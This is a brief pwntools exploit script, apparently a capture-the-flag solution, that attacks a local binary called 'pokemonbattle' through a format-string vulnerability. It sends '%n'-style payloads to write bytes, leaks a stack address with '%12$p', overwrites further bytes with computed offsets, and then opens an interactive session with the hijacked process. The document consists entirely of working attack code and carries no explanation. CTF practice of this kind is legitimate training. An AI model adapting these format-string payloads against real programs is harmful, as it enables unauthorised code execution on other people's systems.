from pwn import *

elf = ELF("./pokemonbattle")
#libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.33.so")

p = elf.process()
raw_input("DEBUG")

payload = b"%112c"
payload += b"%7$hhn"

p.sendline(payload)
p.recvuntil("I choose you!\n")
payload = b"%12$p"

p.sendline(payload)
p.recvuntil("Choose a pokemon: ")
leak = p.recvuntil(", ",drop= True)
leak = leak[-2:]
print(leak)
leak = int(leak,16) - 8

payload = ("%{}c".format(leak)).encode()
payload += b"%12$hhn"

p.sendline(payload)

payload = b"%195c%20$hhn"
p.sendline(payload)

payload = b"%104c"
payload += b"%7$hhn"

p.sendline(payload)

p.interactive()

